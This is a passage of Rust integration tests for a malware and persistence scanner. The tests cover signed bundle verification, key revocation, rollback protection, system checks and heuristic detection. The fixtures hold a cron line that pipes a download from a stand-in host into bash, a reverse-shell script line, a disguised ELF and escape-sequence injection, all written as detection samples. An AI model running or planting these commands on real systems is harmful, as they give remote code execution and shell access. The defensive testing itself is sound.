                r#"{{"format":"abyssal-warden.keyring","format_version":1,{extra}"keys":[{}]}}"#,
                entries.join(",")
            ),
        )
        .unwrap();
        path.to_owned()
    }

    #[test]
    fn keyring_threshold_requires_two_signers() {
        let dir = tempfile::tempdir().unwrap();
        let (a, b) = (Key::new(), Key::new());
        let ring = keyring_of(
            &dir.path().join("k.json"),
            &[&a, &b],
            r#""policy":{"threshold":2},"#,
        );
        let state = dir.path().join("state.json");
        let bundle = make_bundle(&dir.path().join("b"), &a, 1, "");

        let out = scan_bundle(&bundle, &ring, &state, &[]);
        assert_eq!(out.status.code(), Some(2));
        assert!(
            String::from_utf8_lossy(&out.stderr)
                .contains("1 valid signature(s) from distinct trusted keys, 2 required")
        );

        b.sign_as(&bundle.join("manifest.json"), 2);
        let out = scan_bundle(&bundle, &ring, &state, &[]);
        assert_eq!(
            out.status.code(),
            Some(1),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        let v: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
        assert_eq!(
            v["content_bundles"][0]["signers"].as_array().unwrap().len(),
            2
        );

        // With a threshold, a single signature on an individual file is not enough.
        let out = run(bin()
            .args(["signatures", "validate", "--keyring"])
            .arg(&ring)
            .arg(example_db()));
        assert_eq!(out.status.code(), Some(2));
        assert!(String::from_utf8_lossy(&out.stderr).contains("signed bundle"));
    }

    #[test]
    fn keyring_floor_protects_a_fresh_installation() {
        let dir = tempfile::tempdir().unwrap();
        let key = Key::new();
        let ring = keyring_of(
            &dir.path().join("k.json"),
            &[&key],
            r#""bundles":[{"name":"cli-test","min_sequence":5}],"#,
        );
        let fresh_state = dir.path().join("fresh.json");
        let old = make_bundle(&dir.path().join("old"), &key, 3, "");
        let out = scan_bundle(&old, &ring, &fresh_state, &[]);
        assert_eq!(out.status.code(), Some(2));
        assert!(String::from_utf8_lossy(&out.stderr).contains("rollback refused"));
        let current = make_bundle(&dir.path().join("current"), &key, 5, "");
        assert_eq!(
            scan_bundle(&current, &ring, &fresh_state, &[])
                .status
                .code(),
            Some(1)
        );
    }

    #[test]
    fn revocation_carried_by_a_bundle_takes_effect() {
        let dir = tempfile::tempdir().unwrap();
        let (old, new) = (Key::new(), Key::new());
        let ring = keyring_of(&dir.path().join("k.json"), &[&old, &new], "");
        let state = dir.path().join("state.json");

        // Release 2, signed with the new key, revokes the old key.
        let rel2 = dir.path().join("rel2");
        make_bundle(&rel2, &new, 2, "");
        let out = run(bin()
            .args([
                "content",
                "manifest",
                "--name",
                "cli-test",
                "--sequence",
                "2",
                "--force",
                "--revoke-key",
            ])
            .arg(old.id())
            .arg(&rel2));
        assert_eq!(out.status.code(), Some(0));
        new.sign(&rel2.join("manifest.json"));
        assert_eq!(
            scan_bundle(&rel2, &ring, &state, &[]).status.code(),
            Some(1)
        );

        // Anything signed only by the old key is now refused, even a newer
        // release: the keyring still lists the old key, but the recorded
        // revocation wins.
        let rel3 = make_bundle(&dir.path().join("rel3"), &old, 3, "");
        let out = scan_bundle(&rel3, &ring, &state, &[]);
        assert_eq!(out.status.code(), Some(2));
        assert!(String::from_utf8_lossy(&out.stderr).contains("revoked"));

        // It also applies to individually signed files.
        let db = dir.path().join("db.json");
        fs::copy(example_db(), &db).unwrap();
        old.sign(&db);
        let out = run(bin()
            .args(["scan", "--keyring"])
            .arg(&ring)
            .arg("--content-state")
            .arg(&state)
            .arg("-s")
            .arg(&db)
            .arg(dir.path().join("rel2")));
        assert_eq!(out.status.code(), Some(2));
        assert!(String::from_utf8_lossy(&out.stderr).contains("revoked"));
    }

    #[test]
    fn example_bundle_verifies_with_example_keyring() {
        let dir = tempfile::tempdir().unwrap();
        let out = run(bin()
            .args(["content", "verify", "--keyring"])
            .arg(examples().join("keys/keyring.json"))
            .arg("--content-state")
            .arg(dir.path().join("s.json"))
            .arg(examples().join("bundle")));
        assert_eq!(
            out.status.code(),
            Some(0),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        assert!(String::from_utf8_lossy(&out.stdout).contains("sequence 1, 2 file(s)"));
    }
}

/// Writes `content` at `rel` below `root`, creating directories.
#[cfg(target_os = "linux")]
fn put(root: &Path, rel: &str, content: &[u8]) {
    let p = root.join(rel);
    fs::create_dir_all(p.parent().unwrap()).unwrap();
    fs::write(p, content).unwrap();
}

#[cfg(target_os = "linux")]
#[test]
fn system_check_offline_root_finds_and_correlates_persistence() {
    let dir = tempfile::tempdir().unwrap();
    let r = dir.path();
    put(r, "etc/passwd", b"root:x:0:0:root:/root:/bin/bash\n");
    put(
        r,
        "etc/systemd/system/app.service",
        b"[Service]\nExecStart=/opt/app/run --daemon\nEnvironment=API_TOKEN=do-not-report-me\n",
    );
    put(r, "opt/app/run", INDICATOR);
    put(
        r,
        "etc/cron.d/update",
        b"@reboot root curl -s http://x.example/a | bash\n",
    );

    let out = run(bin()
        .args(["system-check", "--root"])
        .arg(r)
        .args(["--no-packages", "--format", "json", "--trusted-key"])
        .arg(test_key())
        .arg("--signatures")
        .arg(example_db()));
    assert_eq!(
        out.status.code(),
        Some(1),
        "stderr: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    let text = String::from_utf8_lossy(&out.stdout);
    assert!(
        !text.contains("do-not-report-me"),
        "environment value leaked"
    );
    let v: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
    assert_eq!(v["schema_version"], 1);
    assert_eq!(v["host"]["live"], false);
    let rules: Vec<&str> = v["findings"]
        .as_array()
        .unwrap()
        .iter()
        .filter_map(|f| f["source"]["rule_id"].as_str())
        .collect();
    assert!(rules.contains(&"AW-SYS-002"), "{rules:?}");
    assert!(rules.contains(&"AW-SYS-016"), "{rules:?}");
    assert_eq!(
        v["referenced_files"]["findings"].as_array().unwrap().len(),
        1
    );
    for c in v["checks"].as_array().unwrap() {
        let id = c["id"].as_str().unwrap();
        if id.starts_with("kernel.") || id.starts_with("processes.") || id == "packages.verify" {
            assert_eq!(c["status"], "skipped", "{id}");
        }
    }
    assert!(
        v["persistence"]
            .as_array()
            .unwrap()
            .iter()
            .any(|e| e["executable"]["text"] == "/opt/app/run")
    );
}

#[cfg(target_os = "linux")]
#[test]
fn system_check_human_output_is_sanitised_and_honest() {
    let dir = tempfile::tempdir().unwrap();
    let r = dir.path();
    put(r, "etc/passwd", b"root:x:0:0:root:/root:/bin/bash\n");
    put(
        r,
        "etc/cron.d/evil",
        b"* * * * * root /tmp/x\x1b[2J\xe2\x80\xae --hide\n",
    );
    let out = run(bin()
        .args([
            "system-check",
            "--show-inventory",
            "--no-packages",
            "--root",
        ])
        .arg(r));
    assert_eq!(out.status.code(), Some(1));
    let text = String::from_utf8(out.stdout).unwrap();
    assert!(!text.contains('\x1b') && !text.contains('\u{202e}'));
    assert!(text.contains("\\u{1b}"));
    assert!(text.contains("AW-SYS-001"));
    assert!(text.contains("not proof that the system is clean"));
    assert!(text.contains("were not scanned"));
}

#[cfg(target_os = "linux")]
#[test]
fn system_check_missing_root_exits_2() {
    let out = run(bin().args([
        "system-check",
        "--no-packages",
        "--root",
        "/nonexistent/abyssal-warden-root",
    ]));
    assert_eq!(out.status.code(), Some(2));
}

#[cfg(target_os = "linux")]
#[test]
fn system_check_detects_a_library_injected_into_itself() {
    // Any harmless shared library the binary never asks for will do.
    let Some(lib) = [
        "/usr/lib64/libz.so.1",
        "/usr/lib/x86_64-linux-gnu/libz.so.1",
        "/lib/x86_64-linux-gnu/libz.so.1",
        "/usr/lib/aarch64-linux-gnu/libz.so.1",
    ]
    .into_iter()
    .find(|p| Path::new(p).exists()) else {
        eprintln!("skipped: no libz.so.1 to preload");
        return;
    };
    let out = run(bin().env("LD_PRELOAD", lib).args([
        "system-check",
        "--no-packages",
        "--no-hidden-processes",
        "--format",
        "json",
    ]));
    let v: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
    let injected: Vec<&serde_json::Value> = v["findings"]
        .as_array()
        .unwrap()
        .iter()
        .filter(|f| f["source"]["rule_id"] == "AW-SYS-019")
        .collect();
    assert_eq!(
        injected.len(),
        1,
        "{}",
        String::from_utf8_lossy(&out.stdout)
    );
    assert!(
        injected[0]["evidence"][0]["summary"]
            .as_str()
            .unwrap()
            .contains("LD_PRELOAD")
    );
    assert_eq!(out.status.code(), Some(1));
}

#[cfg(windows)]
#[test]
fn system_check_runs_on_windows() {
    let out = run(bin().args(["system-check", "--format", "json"]));
    // 1 (something to review) or 3 (some checks unsupported); never an error.
    assert!(
        matches!(out.status.code(), Some(1 | 3)),
        "status {:?}, stderr: {}",
        out.status.code(),
        String::from_utf8_lossy(&out.stderr)
    );
    let v: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
    assert_eq!(v["host"]["os"], "windows");
}

#[test]
fn heuristics_are_opt_in_and_reported_for_review() {
    let dir = tempfile::tempdir().unwrap();
    // An "ELF" named like a photo, a reverse-shell script, a double extension.
    fs::write(
        dir.path().join("holiday.jpg"),
        b"\x7fELF\x02\x01\x01\0garbage",
    )
    .unwrap();
    fs::write(
        dir.path().join("update.sh"),
        b"#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n",
    )
    .unwrap();
    fs::write(dir.path().join("invoice.pdf.exe"), b"not really a program").unwrap();
    fs::write(
        dir.path().join("notes.txt"),
        b"curl x | sh (a note, not a script)",
    )
    .unwrap();

    // Without --heuristics: nothing is evaluated.
    let out = run(bin().args(["scan", "--format", "json"]).arg(dir.path()));
    assert_eq!(out.status.code(), Some(0));

    let out = run(bin()
        .args(["scan", "--heuristics", "--format", "json"])
        .arg(dir.path()));
    assert_eq!(
        out.status.code(),
        Some(1),
        "stderr: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    let v: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
    let mut rules: Vec<&str> = v["findings"]
        .as_array()
        .unwrap()
        .iter()
        .map(|f| {
            assert!(matches!(
                f["kind"].as_str(),
                Some("heuristic" | "suspicious")
            ));
            assert_ne!(f["confidence"], "confirmed");
            assert_eq!(f["recommended_action"], "review");
            f["source"]["rule_id"].as_str().unwrap()
        })
        .collect();
    rules.sort_unstable();
    // The temporary-location rule depends on where the test's temporary
    // directory lives (usually /tmp or %TEMP%).
    let in_temp = rules.contains(&"AW-HEU-040");
    rules.retain(|r| *r != "AW-HEU-040");
    assert_eq!(rules, ["AW-HEU-001", "AW-HEU-002", "AW-HEU-031"]);
    let tmp = dir
        .path()
        .to_string_lossy()
        .replace('\\', "/")
        .to_ascii_lowercase();
    assert_eq!(in_temp, tmp.starts_with("/tmp/") || tmp.contains("/temp/"));
    assert!(
        v["detectors"]
            .as_array()
            .unwrap()
            .iter()
            .any(|d| d["id"] == "heuristics")
    );

    // Heuristic findings are never quarantined automatically.
    let store = tempfile::tempdir().unwrap();
    let out = run(bin()
        .args([
            "scan",
            "--heuristics",
            "--quarantine",
            "--format",
            "json",
            "--quarantine-store",
        ])
        .arg(store.path().join("q"))
        .arg(dir.path()));
    let v: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
    assert!(
        v["findings"]
            .as_array()
            .unwrap()
            .iter()
            .all(|f| f["remediation_status"] != "quarantined")
    );
    assert!(dir.path().join("update.sh").exists());
}
